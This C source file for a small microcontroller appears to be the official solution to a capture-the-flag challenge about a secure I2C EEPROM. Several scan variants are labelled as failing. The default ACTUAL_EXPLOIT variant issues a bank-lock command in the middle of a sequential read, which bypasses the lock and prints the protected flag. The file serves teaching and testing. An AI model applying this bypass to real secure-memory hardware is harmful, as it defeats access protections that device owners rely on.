// Copyright 2019 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#if !defined(SIMPLE_SCAN) && !defined(CONTINOUS_RAW_SCAN) && \
    !defined(RANDOM_ACCESS_RAW_SCAN) && !defined(SECURE_AND_SCAN)
#define ACTUAL_EXPLOIT
#endif

__sfr __at(0xff) POWEROFF;
__sfr __at(0xfe) DEBUG;
__sfr __at(0xfd) CHAROUT;
__xdata __at(0xff00) unsigned char FLAG[0x100];

__sfr __at(0xfa) RAW_I2C_SCL;
__sfr __at(0xfb) RAW_I2C_SDA;

// I2C-M module/chip control data structure.
__xdata __at(0xfe00) unsigned char I2C_ADDR; // 8-bit version.
__xdata __at(0xfe01) unsigned char I2C_LENGTH;  // At most 8 (excluding addr).
__xdata __at(0xfe02) unsigned char I2C_RW_MASK;  // 1 R, 0 W.
__xdata __at(0xfe03) unsigned char I2C_ERROR_CODE;  // 0 - no errors.
__xdata __at(0xfe08) unsigned char I2C_DATA[8];  // Don't repeat addr.
__sfr __at(0xfc) I2C_STATE;  // Read: 0 - idle, 1 - busy; Write: 1 - start

const SEEPROM_I2C_ADDR_MEMORY = 0b10100000;
const SEEPROM_I2C_ADDR_SECURE = 0b01010000;

typedef unsigned char bool;
#define true 1
#define false 0

void print(const char *str) {
  while (*str) {
    CHAROUT = *str++;
  }
}

// Helper functions for I2C bit-banging. Source:
// https://en.wikipedia.org/wiki/I%C2%B2C#Example_of_bit-banging_the_I%C2%B2C_master_protocol
bool read_SCL(void) { return RAW_I2C_SCL; }
bool read_SDA(void) { return RAW_I2C_SDA; }
void set_SCL(void) { RAW_I2C_SCL = 1; }
void clear_SCL(void) { RAW_I2C_SCL = 0; }
void set_SDA(void) { RAW_I2C_SDA = 1; }
void clear_SDA(void) { RAW_I2C_SDA = 0; }
void arbitration_lost(void) {
  print("arbitration lost");
}

bool started = false; // global data

void i2c_start_cond(void) {
  if (started) {
    // if started, do a restart condition
    // set SDA to 1
    set_SDA();
    set_SCL();
    while (read_SCL() == 0) { // Clock stretching
      // You should add timeout to this loop
    }
  }

  // SCL is high, set SDA from 1 to 0.
  clear_SDA();
  clear_SCL();
  started = true;
}

void i2c_stop_cond(void) {
  // set SDA to 0
  clear_SDA();

  set_SCL();
  // Clock stretching
  while (read_SCL() == 0) {
    // add timeout to this loop.
  }

  // SCL is high, set SDA from 0 to 1
  set_SDA();
  started = false;
}

// Write a bit to I2C bus
void i2c_write_bit(bool bit) {
  if (bit) {
    set_SDA();
  } else {
    clear_SDA();
  }

  // Set SCL high to indicate a new valid SDA value is available
  set_SCL();

  while (read_SCL() == 0) { // Clock stretching
    // You should add timeout to this loop
  }

  // Clear the SCL to low in preparation for next change
  clear_SCL();
}

// Read a bit from I2C bus
bool i2c_read_bit(void) {
  bool bit;

  // Let the slave drive data
  set_SDA();

  // Set SCL high to indicate a new valid SDA value is available
  set_SCL();

  while (read_SCL() == 0) { // Clock stretching
    // You should add timeout to this loop
  }

  // SCL is high, read out bit
  bit = read_SDA();

  // Set SCL low in preparation for next operation
  clear_SCL();

  return bit;
}

// Write a byte to I2C bus. Return 0 if ack by the slave.
bool i2c_write_byte(bool send_start,
                    bool send_stop,
                    unsigned char byte) {
  unsigned bit;
  bool     nack;

  if (send_start) {
    i2c_start_cond();
  }

  for (bit = 0; bit < 8; ++bit) {
    i2c_write_bit((byte & 0x80) != 0);
    byte <<= 1;
  }

  nack = i2c_read_bit();

  if (send_stop) {
    i2c_stop_cond();
  }

  return nack;
}

// Read a byte from I2C bus
unsigned char i2c_read_byte(bool nack, bool send_stop) {
  unsigned char byte = 0;
  unsigned char bit;

  for (bit = 0; bit < 8; ++bit) {
    byte = (byte << 1) | i2c_read_bit();
  }

  i2c_write_bit(nack);

  if (send_stop) {
    i2c_stop_cond();
  }

  return byte;
}
// End of functions from wikipedia.

void seeprom_wait_until_idle() {
  while (I2C_STATE != 0) {}
}

void seeprom_write_byte(unsigned char addr, unsigned char value) {
  seeprom_wait_until_idle();

  I2C_ADDR = SEEPROM_I2C_ADDR_MEMORY;
  I2C_LENGTH = 2;
  I2C_ERROR_CODE = 0;
  I2C_DATA[0] = addr;
  I2C_DATA[1] = value;
  I2C_RW_MASK = 0b00;  // 2x Write Byte

  I2C_STATE = 1;
  seeprom_wait_until_idle();
}

unsigned char seeprom_read_byte(unsigned char addr) {
  seeprom_wait_until_idle();

  I2C_ADDR = SEEPROM_I2C_ADDR_MEMORY;
  I2C_LENGTH = 2;
  I2C_ERROR_CODE = 0;
  I2C_DATA[0] = addr;
  I2C_RW_MASK = 0b10;  // Write Byte, then Read Byte

  I2C_STATE = 1;
  seeprom_wait_until_idle();

  if (I2C_ERROR_CODE != 0) {
    return 0;
  }

  return I2C_DATA[1];
}

void seeprom_secure_banks(unsigned char mask) {
  seeprom_wait_until_idle();

  I2C_ADDR = SEEPROM_I2C_ADDR_SECURE | (mask & 0b1111);
  I2C_LENGTH = 0;
  I2C_ERROR_CODE = 0;

  I2C_STATE = 1;
  seeprom_wait_until_idle();
}

void main(void) {
  unsigned int i;

#ifdef SIMPLE_SCAN
  // Simple scan.
  print("[EX] Simple scan (shouldn't output the flag)\n");
  for (i = 0; i < 256; i++) {
    char data[2] = {0, 0};
    unsigned char x = seeprom_read_byte(i);

    if (x < 0x20 || x >= 0x7f) {
      continue;
    }
    data[0] = (char)x;
    print(data);
  }
  print("\n");
#endif

#ifdef CONTINOUS_RAW_SCAN
  // Continous raw I2C scan.
  print("[EX] Continous scan (shouldn't output the flag)\n");
  i2c_write_byte(true, false, SEEPROM_I2C_ADDR_MEMORY);
  i2c_write_byte(false, false, 0);
  i2c_write_byte(true, false, SEEPROM_I2C_ADDR_MEMORY | 1);

  for (i = 0; i < 256; i++) {
    char data[2] = {0, 0};
    unsigned char x = i2c_read_byte(false, i == 255);

    if (x < 0x20 || x >= 0x7f) {
      continue;
    }
    data[0] = (char)x;
    print(data);
  }
  print("\n");
#endif

#ifdef RANDOM_ACCESS_RAW_SCAN
  // Random access raw I2C scan.
  print("[EX] Random address scan (shouldn't output the flag)\n");

  for (i = 0; i < 256; i++) {
    char data[2] = {0, 0};
    unsigned char x;

    i2c_write_byte(true, false, SEEPROM_I2C_ADDR_MEMORY);
    i2c_write_byte(false, false, i);
    i2c_write_byte(true, false, SEEPROM_I2C_ADDR_MEMORY | 1);
    x = i2c_read_byte(false, true);

    if (x < 0x20 || x >= 0x7f) {
      continue;
    }
    data[0] = (char)x;
    print(data);
  }
  print("\n");
#endif

#ifdef SECURE_AND_SCAN
  // Another fail exploit.
  print("[EX] Secure and scan (shouldn't output the flag)\n");
  i2c_write_byte(true, false, SEEPROM_I2C_ADDR_SECURE | 0xf);
  i2c_write_byte(true, false, SEEPROM_I2C_ADDR_MEMORY | 1);

  i2c_write_byte(true, false, SEEPROM_I2C_ADDR_MEMORY);
  i2c_write_byte(false, false, 0);
  i2c_write_byte(true, false, SEEPROM_I2C_ADDR_MEMORY | 1);

  for (i = 0; i < 128; i++) {
    char data[2] = {0, 0};
    unsigned char x = i2c_read_byte(false, i == 127);

    if (x >= 0x20 && x < 0x7f) {
      data[0] = (char)x;
      print(data);
    }
  }
  print("\n");
#endif

#ifdef ACTUAL_EXPLOIT
  // Actual exploit.
  print("[EX] Exploiting...\n");
  i2c_write_byte(true, false, SEEPROM_I2C_ADDR_MEMORY);
  i2c_write_byte(false, false, 0);
  i2c_write_byte(true, false, SEEPROM_I2C_ADDR_MEMORY | 1);

  for (i = 0; i < 128; i++) {
    char data[2] = {0, 0};
    unsigned char x = i2c_read_byte(false, i == 127);

    if (x >= 0x20 && x < 0x7f) {
      data[0] = (char)x;
      print(data);
    }

    if (i == 0) {
      i2c_write_byte(true, false, SEEPROM_I2C_ADDR_SECURE | 0xf);
      i2c_write_byte(true, false, SEEPROM_I2C_ADDR_MEMORY | 1);
    }
  }
  print("\n");
#endif

  print("[EX] Finished.\n");
  POWEROFF = 1;
}
